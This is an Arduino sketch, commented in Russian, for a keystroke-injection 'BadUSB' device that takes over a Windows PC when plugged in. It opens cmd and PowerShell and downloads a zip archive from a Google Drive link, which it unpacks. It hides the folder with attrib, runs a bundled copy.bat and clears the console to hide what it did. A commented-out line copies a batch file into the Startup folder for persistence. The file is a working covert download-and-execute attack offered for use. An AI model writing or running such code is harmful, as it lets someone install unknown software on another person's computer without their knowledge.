
 #include <Keyboard.h>
void setup(){
    Keyboard.begin();
    delay(2000);
    createFolder();
    getFiles();
    setUpFiles();
}
void loop(){}
void winPlusR() {
    Keyboard.press(KEY_LEFT_GUI);
    Keyboard.press('r');
    delay(45);
    Keyboard.releaseAll();
    delay(100);
}
void createFolder(){
    winPlusR();
    // запусаем командную строку
    Keyboard.println("cmd");
    Keyboard.write(KEY_RETURN);
    delay(500);
    // переходим надиск C:
    Keyboard.println("cd C:/"); 
    Keyboard.write(KEY_RETURN);
    delay(100);
    // создаём папку "Downloads"
    Keyboard.println("mkdir Downloads"); 
    Keyboard.write(KEY_RETURN);
    delay(100);
    // закрываем окно
    Keyboard.println("exit"); 
    Keyboard.write(KEY_RETURN);
    delay(2000);
}
void getFiles(){
    winPlusR();
    // открываем powershell
    Keyboard.println("powershell"); 
    Keyboard.write(KEY_RETURN);
    delay(1000);
   
    // переходим в папку Downloads
    Keyboard.println("cd C:/Downloads/"); 
    Keyboard.write(KEY_RETURN);
    delay(1000);
    // задаём адрес для скачивания
    Keyboard.println("$download_url = 'https://drive.usercontent.google.com/u/0/uc?id=1Z1o1fJkmKB80N1FpPwvtpHLydsLfILlc&export=download'");
    Keyboard.write(KEY_RETURN);
    delay(1000);
    // задаём локальный путь для сохранения файла
    Keyboard.println("$local_path = 'C:/Downloads/arch.zip'"); 
    Keyboard.write(KEY_RETURN);
    delay(1000);
    // запускаем веб клиент
    Keyboard.println("$WebClient = New-Object System.Net.WebClient"); 
    Keyboard.write(KEY_RETURN);
    delay(500);
    // качаем архив
    Keyboard.println("$WebClient.DownloadFile($download_url, $local_path)"); 
    Keyboard.write(KEY_RETURN);
    delay(1250);
    // распаковываем его
    Keyboard.println("Expand-Archive arch.zip"); 
    Keyboard.write(KEY_RETURN);
    delay(750);
    // закрываем окно
    Keyboard.println("exit"); 
    Keyboard.write(KEY_RETURN);
    delay(200);
}
void setUpFiles(){
    winPlusR();
    // открываем командную строку
    Keyboard.println("cmd");
    Keyboard.write(KEY_RETURN);
    delay(100);
    // переходим на диск C:
    Keyboard.println("cd C:/");
    Keyboard.write(KEY_RETURN);
    delay(100);
    // делаем папку Downloads невидимой для пользователя
    Keyboard.println("attrib +h Downloads");
    Keyboard.write(KEY_RETURN);
    
    delay(100);
    // Делаем файлы в папке Downloads невидимыми
    Keyboard.println("attrib +h Downloads/");
    Keyboard.write(KEY_RETURN);
    delay(100);
    //Переходим в разархивированную папку
    Keyboard.println("cd C:/Downloads/arch/");
    Keyboard.write(KEY_RETURN);
    //Запускаем скрипт "copy.bat"
    Keyboard.println("copy.bat");
    Keyboard.write(KEY_RETURN);
    // прописываем в автозагрузку
    //Keyboard.println("copy arch.bat C:/Users/оператор/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup ");
    //Keyboard.write(KEY_RETURN);
    delay(250);
    // стираем написанное и закрываем cmd
    Keyboard.println("cls && exit");
    Keyboard.write(KEY_RETURN);
    
}


